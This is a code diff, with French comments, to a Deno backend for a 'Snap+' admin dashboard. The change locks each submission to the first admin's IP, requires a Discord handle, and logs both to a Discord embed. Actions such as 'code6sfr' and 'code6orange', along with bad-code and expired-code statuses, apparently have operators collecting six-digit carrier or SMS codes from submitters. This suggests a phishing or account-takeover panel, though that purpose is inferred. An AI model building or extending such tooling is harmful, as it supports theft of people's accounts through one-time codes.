@@ -26,7 +26,7 @@ const statusMap = {
 
 Deno.serve(async (req) => {
   try {
-    const { submissionId, action } = await req.json();
+    const { submissionId, action, discord } = await req.json();
 
     if (!submissionId) {
       return Response.json({ error: 'submissionId requis' }, { status: 400 });
@@ -41,11 +41,9 @@ Deno.serve(async (req) => {
     // Fetch submission details
     const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);
 
-    // ---- Verrou par IP admin : une fois qu'un admin a envoyé le code,
-    // seule son IP peut effectuer les actions suivantes sur cette demande. ----
-    const SEND_CODE_ACTIONS = ["code_ready", "code6", "code6sfr", "code6orange"];
-    const isCodeSendAction = SEND_CODE_ACTIONS.includes(action);
-
+    // ---- Verrou par IP admin : la première action (envoi de code / validation /
+    // mauvais / expiré) verrouille la demande à cette IP et exige un pseudo Discord
+    // pour identifier l'administrateur dans les logs. ----
     if (sub?.admin_ip) {
       // Une IP admin est déjà enregistrée : vérifie la correspondance
       if (sub.admin_ip !== adminIp) {
@@ -54,10 +52,18 @@ Deno.serve(async (req) => {
           { status: 403 }
         );
       }
-    } else if (isCodeSendAction) {
-      // Premier envoi de code : on verrouille la demande à cette IP admin
-      await base44.asServiceRole.entities.Submission.update(submissionId, { admin_ip: adminIp });
+    } else {
+      // Première action sur cette demande : pseudo Discord obligatoire
+      const discordClean = (discord || "").trim().replace(/^@+/, "");
+      if (!discordClean) {
+        return Response.json({ discord_required: true }, { status: 200 });
+      }
+      await base44.asServiceRole.entities.Submission.update(submissionId, {
+        admin_ip: adminIp,
+        admin_discord: discordClean,
+      });
       sub.admin_ip = adminIp;
+      sub.admin_discord = discordClean;
     }
 
     await base44.asServiceRole.entities.Submission.update(submissionId, { status: newStatus });
@@ -124,7 +130,8 @@ Deno.serve(async (req) => {
         { name: "🌍 Pays", value: country, inline: true },
         { name: "💾 Appareil", value: device, inline: true },
         { name: "🕵️ IP Admin", value: `\`${adminIp}\``, inline: true },
-        { name: "🕐 Heure", value: heureStr, inline: true },
+        { name: "🎮 Discord", value: sub?.admin_discord ? `@${sub.admin_discord}` : "N/A", inline: true },
+        { name: "🕐 Heure", value: heureStr, inline: false },
       ],
       footer: { text: `Admin Dashboard • Snap+` },
       timestamp: now.toISOString(),
